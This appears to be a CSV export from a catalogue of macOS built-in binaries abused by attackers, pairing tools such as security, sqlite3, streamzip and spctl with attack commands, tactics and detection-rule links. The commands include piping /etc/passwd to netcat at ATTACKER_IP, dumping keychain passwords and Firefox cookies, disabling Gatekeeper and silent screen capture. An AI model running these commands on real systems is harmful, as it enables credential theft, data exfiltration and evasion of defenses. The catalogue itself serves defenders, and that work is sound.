"name","author","short_description","full_description","created","example_use_cases","example_use_cases_name","example_use_cases_description","example_use_cases_code","example_use_cases_tactics","example_use_cases_tags","paths","detections","detections_name","detections_url","resources","resources_name","resources_url","acknowledgements","is_legit"
"streamzip","Gabriel De Jesus (0xv1n)","File-less compression of data passed in through stdin.","streamzip is a system utility that can be utilized to compress data from ""stdin"" and write the data directly to ""stdout"", no temporary files are created. The tool can be used by malicious actors to collect and exfiltrate sensitive data without leaving staged data archive artifacts on disk.","2024-07-15","","Copy and compress sensitive data locally","The following command reads file data and compresses the data for exfiltration","dd if=/etc/passwd | streamzip - stream | nc ATTACKER_IP PORT","[''Collection''-|-''Exfiltration'']","[''files''-|-''compress'']","/usr/bin/streamzip","","No detection content at time of writing","N/A","","streamzip man page","https://docs.oracle.com/cd/E88353_01/html/E37839/streamzip-1.html","","false"
"ssh-keygen","Leo Pitt (@_D00mfist)","Load unsigned dynamic libraries into the ssh-keygen binary.","ssh-keygen is a tool for creating new authentication key pairs for SSH (Secure Shell). ssh-keygen holds the ""com.apple.security.cs.disable-library-validation"" entitlement and is capable of loading arbitrary libraries without requiring signed code.","2023-05-22","","Execute malicious dynamic library (.dylib) from standard input","An attacker can execute a malicious .dylib from stdin by echoing a load command and piping to tclsh. This will bypass code signing requirements.","ssh-keygen -D /private/tmp/evil.dylib","[''Execution''-|-''Defense Evasion'']","dylib","/usr/bin/ssh-keygen","","Recommendations included in resource below. No formal detection content at this time.","https://medium.com/@D00MFist/generate-keys-or-generate-dylib-loads-c99ed48f323d","","Generate Keys or Generate Dylib Loads?","https://medium.com/@D00MFist/generate-keys-or-generate-dylib-loads-c99ed48f323d","","false"
"sqlite3","Brendan Chamberlain (@infosecB)","Query and manage sqlite databases.","sqlite is a command-line utility that allows users to query and manage sqlite databases. Many components of macOS and apps used sqlite to store data. Attackers can leverage this tool to discover sensitive data.","2023-05-23","","[''Get apps with Full Disk access''-|-''Get Firefox cookie data''-|-''View URL associated with file downloads'']","[''The following command interacts with the TCC (Transparency, Consent, and Control) database to show the apps that have Full Disk access permission''-|-''The following one-liner can be used to kill Firefox and dump cookie data from the user's Firefox profile.''-|-''The following sqlite command is commonly used by macOS malware to view the URL in which the payload was downloaded from.'']","[''sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \ 'select client from access where auth_value and service = ""kTCCServiceSystemPolicyAllFiles""'''-|-''killall firefox; find ~/Library/Application\ Support/Firefox/Profiles/. | grep cookies.sqlite | xargs -I {} sqlite3 {} ""select * from moz_cookies""''-|-''sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV* 'select LSQuarantineDataURLString from LSQuarantineEvent''']","[''Discovery''-|-''Collection''-|-''Credential Access''-|-''Collection''-|-''Credential Access'']","[''permissions''-|-''oneliner''-|-''cookie-theft''-|-''oneliner''-|-''cookie-theft'']","/usr/bin/sqlite3","","[''Elastic Detection Rules: Potential Privacy Control Bypass via TCCDB Modification''-|-''Splunk Security Content: Suspicious SQLite3 LSQuarantine Behavior''-|-''Jamf Protect: Detect SQLite3 activity used to associated URLs with downloaded files'']","[''https://github.com/elastic/detection-rules/blob/e9baebc2bc18f90ae16501613cd9521a16a38ad7/rules/macos/defense_evasion_privacy_controls_tcc_database_modification.toml''-|-''https://github.com/splunk/security_content/blob/c65dda5c0aa73a97f28c49c20739971ec1ba18a6/dev/endpoint/suspicious_sqlite3_lsquarantine_behavior.yml#L2''-|-''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/sqlite3_downloads'']","","[''TCC.db Modifier Script''-|-''Clipping Silver Sparrow’s wings: Outing macOS malware before it takes flight'']","[''https://github.com/bp88/JSS-Scripts/blob/master/TCC.db%20Modifier.sh''-|-''https://redcanary.com/blog/clipping-silver-sparrows-wings/'']","","false"
"spctl","Brendan Chamberlain (@infosecB)","Manage the security assessment policy subsystem, Gatekeeper settings, and control which apps are allowed to run on the system.","Manage the security assessment policy subsystem, Gatekeeper settings, and control which apps are allowed to run on the system.","2023-05-23","","Disable Gatekeeper","The --master-disable switch disables Gatekeeper. The command must be run with root/sudo permission.","sudo spctl --master-disable","Defense Evasion","gatekeeper","/usr/sbin/spctl","","[''Elastic Detection Rules: Attempt to Disable Gatekeeper''-|-''Sigma Rules: Disable Security Tools'']","[''https://github.com/elastic/detection-rules/blob/e9baebc2bc18f90ae16501613cd9521a16a38ad7/rules/macos/defense_evasion_attempt_to_disable_gatekeeper.toml''-|-''https://github.com/SigmaHQ/sigma/blob/cd71edc09ca915f389e50df5b1bbb5ecd4b7f89d/rules/macos/process_creation/proc_creation_macos_disable_security_tools.yml'']","","Disable Gatekeeper on macOS Big Sur (11.x)","https://disable-gatekeeper.github.io/","","false"
"softwareupdate","Jonathan Bar Or (@yo_yo_yo_jbo)","Interact with the macOS software update service.","A command-line utility for running software updates.","2023-04-25","","[''Get OS and browser version information''-|-''Get OS update policy'']","[''Determine OS and Safari version by enumerating the available software updates.''-|-''Use the --schedule flag to return the OS update policy.'']","[''softwareupdate --list''-|-''softwareupdate --schedule'']","[''Discovery''-|-''Discovery'']","[''os''-|-''os'']","/usr/sbin/softwareupdate","","No detections at time of publishing","N/A","","softwareupdate Man Page","https://ss64.com/osx/softwareupdate.html","","false"
"sfltool","Eliott (@Koyiott)","Binary to manage the Shared File List framework.","sfltool allows interactions with the Shared File List framework, which can be used to modify application recent documents, favorites, and more.","2023-09-12","","[''Display Login Items''-|-''Reset Login Items to Defaults'']","[''Identify all current login and background items configured on the system.''-|-''Reset all third-party Login Items and revert to installation defaults.'']","[''sfltool dumpbtm''-|-''sfltool resetbtm'']","[''Discovery''-|-''Defense Evasion'']","[''bash''-|-''startup''-|-''bash''-|-''system_reset'']","/usr/bin/sfltool","","Jamf Protect: Detect attempts to dump BTM or being reverted to installation defaults","https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/sfltool_activity","","[''sfltool man page''-|-''Controlling login and background items'']","[''https://www.unix.com/man-page/mojave/1/sfltool/''-|-''https://eclecticlight.co/2023/02/15/controlling-login-and-background-items-in-ventura/'']","","false"
"security","Pratik Jeware (@Pratik-987), Brendan Chamberlain (@infosecb)","Interact with Keychain, macOS's built-in password manager.","security is a command-line utility included in macOS that allows users to interact with the Keychain app. Keychains allow users to manager passwords and credentials for many services and features, including Wi-Fi and website passwords, secure notes, certificates, and Kerberos.","2023-04-24","","[''Dump credentials, keys, certificates, and other senstive information from Keychain''-|-''Retrieve Chrome's ""Chrome Safe Storage"" password manager secret''-|-''Add an arbitrary trusted certificate to aid a MITM attack'']","[''This command will dump keychain passwords from login.keychain''-|-''This command will retrieve the Chrome Safe Storage password manager secret from the keychain.''-|-''This command will add a certificate to the keychain.'']","[''sudo security dump-keychain -d login.keychain''-|-''security find-generic-password -w -s ""Chrome Safe Storage""''-|-''security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain bad_cert.crt'']","[''Credential Access''-|-''Credential Access''-|-''Defense Evasion'']","[''bash''-|-''bash''-|-''chrome''-|-''bash''-|-''certificate'']","/usr/bin/security","","[''Sigma: Credentials from Password Stores - Keychain''-|-''Elastic: Access to Keychain Credentials Directories''-|-''Elastic: Credential Access Dumping Keychain Security''-|-''Elastic: Keychain Password Retrieval via Command Line''-|-''Jamf Protect: Detect Keychain dumping using security'']","[''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_creds_from_keychain.yml''-|-''https://github.com/elastic/detection-rules/blob/main/rules/macos/credential_access_credentials_keychains.toml''-|-''https://github.com/elastic/detection-rules/blob/main/rules/macos/credential_access_dumping_keychain_security.toml''-|-''https://github.com/elastic/detection-rules/blob/main/rules/macos/credential_access_keychain_pwd_retrieval_security_cmd.toml''-|-''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/keychain_dumped'']","","[''Using the OS X Keychain to store and retrieve passwords''-|-''SS64 security man page'']","[''https://www.netmeister.org/blog/keychain-passwords.html''-|-''https://ss64.com/osx/security.html'']","","false"
"scutil","Ethan Nay","Display basic network information, check the dns config, set the computer hostname and perform several other tasks.","scutil provides a command line interface to the dynamic store data maintained by configd. Interaction with this data (using the SystemConfiguration.framework SCDynamicStore APIs) is handled with a set of commands read from standard input.","2023-06-21","","[''DNS configuration''-|-''Proxy configuration''-|-''Network reachability''-|-''Hostname, localhost name and computername'']","[''Get the current DNS configuration of the systems''-|-''Get the current proxy configuration of the systems''-|-''Check if the destination host is reachable from your Mac''-|-''Display the current hostname, localhost name and computername'']","[''scutil --dns''-|-''scutil --proxy''-|-''scutil -r { nodename | address | local-address remote-address }''-|-''scutil --get { HostName | LocalHostName | ComputerName }'']","[''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery'']","[''network''-|-''network''-|-''configuration''-|-''network''-|-''configuration''-|-''configuration'']","/usr/bin/scutil","","No detections at time of publishing","N/A","","[''macOS/binaries/scutil''-|-''scutil man page'']","[''https://macosbin.com/bin/scutil''-|-''https://ss64.com/osx/scutil.html'']","","false"
"screencapture","Brendan Chamberlain (@infosecB)","Capture a screenshot from command line.","A tools that allows users to take screenshots of their desktop or specific app windows. The tool can be used by malicious actors to collect sensitve information from the targeted system.","2023-04-27","","Continously capture screenshots","The following command demonstrates how an attacker can use the tool to capture screenshots every 10 seconds. The -x flag prevents snapshot sounds from being played.","while true; do ts=$(date +""%Y%m%d-%H%M%S""); o=""/tmp/screenshots""; screencapture -x ""$o/ss-$ts.png""; sleep 10; done","Collection","oneliner","/usr/sbin/screencapture","","Sigma: Screen Capture - macOS","https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_screencapture.yml","","SS64 screencapture man page","https://ss64.com/osx/screencapture.html","","false"
"say","Pinar Sadioglu (@p_sadioglu)","Convert text to audible speech.","This tool uses the Speech Synthesis manager to convert input text to audible speech and either play it through the sound output device chosen in System Preferences or save it to an AIFF file.","2023-11-17","","[''Read sensitive data''-|-''Collect clipboard data'']","[''The following command can read and process sensitive files and redirects the output to a file..''-|-''The command is designed to enhance privacy by muting the system volume,using a less recognizable ""Whisper"" voice with the ""say"" command, processing the copied text in the clipboard, and saving the output to a file named ""loot.txt.""'']","[''say -f /home/user/sensitive-files -i  > loot.txt;''-|-''osascript -e 'set volume output muted true' ;   say $(pbpaste) -i  > loot.txt;'']","[''Defense Evasion''-|-''Collection''-|-''Defense Evasion''-|-''Reconnaissance''-|-''Discovery''-|-''Collection'']","[''bash''-|-''pbpaste''-|-''clipboard''-|-''bash''-|-''osascript'']","/usr/bin/say","","No detection content available","N/A","","say man page","https://ss64.com/osx/say.html","","false"
"safaridriver","Brendan Chamberlain (@infosecB)","Enable the WebDriver Safari browser API for Selenium testing.","safaridriver is a tool that is used to enable Selenium testing via the macOS WebDriver protocol. Once enabled, the WebDriver API could be abused by attackers to communicate with external servers for command and control or exfiltration purposes.","2023-05-20","","Enable safaridriver","The following command can be used to enable the WebDriver Safari browser API. The command must be run as root or with sudo privileges.","sudo safaridriver --enable","[''Command and Control''-|-''Exfiltration'']","[''safari''-|-''selenium'']","[''/System/Cryptexes/App/usr/bin/safaridriver''-|-''/usr/bin/safaridriver'']","","No detections at time of publishing","N/A","","[''About WebDriver for Safari''-|-''You Talking To Me?'']","[''https://developer.apple.com/documentation/webkit/about_webdriver_for_safari''-|-''https://starlabs.sg/blog/2021/04-you-talking-to-me/'']","Chris Ross, Cedric Owens: Farming The Apple Orchards: Living Off The Land Techniques","false"
"profiles","Will Huang (@In0de_16)","List and remove configuration profiles.","Profiles on macOS are responsible for managing different types of profiles including configuration, provisioning, bootstraptoken, or enrollment. However, starting from macOS 11.0, this tool cannot be used for installing configuration profiles.","2023-05-16","","[''Collect system DEP information.''-|-''Remove configuration profiles.'']","[''The following command determines whether device is DEP(Device Enrolment Program) enabled and output the DEP information.''-|-''The following command deletes the specified profiles. An optional password used when removing a configuration profile which requires the password removal option.'']","[''sudo profiles show -type enrollment''-|-''profiles remove -identifier com.profile.identifier -password <password>'']","[''Discovery''-|-''Impact'']","[''oneliner''-|-''oneliner'']","/usr/bin/profiles","","No detections at time of publishing.","N/A","","macOS MDM introduction.","https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-mdm","","false"
"plutil","Brendan Chamberlain (@infosecB)","Read, create or edit plist files.","plutil is a command-line utility used for managing property list (.plist) files. These files are commonly used by macOS to store a app settings and other configuration info. The utility allows users to check the validity of plist files `plutil -lint`, convert plist files between XML and binary formats (plutil -convert), and add, modify or remove plist key value pairs.","2023-05-07","","Set app to run with dock icon hidden","plutil can be used to set the ""LSUIElement"" attribute to tue which will force the targeted app to run without the UI and dock icon.","plutil -insert LSUIElement -string ""1"" /Applications/TargetApp.app/Contents/Info.plist","Defense Evasion","plist","/usr/bin/plutil","","Splunk Security Content: MacOS plutil","https://research.splunk.com/endpoint/c11f2b57-92c1-4cd2-b46c-064eafb833ac/","","[''Editing Property Lists with plutil''-|-''Plist File Modification (MITRE ATT&CK)'']","[''https://scriptingosx.com/2016/11/editing-property-lists/''-|-''https://attack.mitre.org/techniques/T1647/'']","","false"
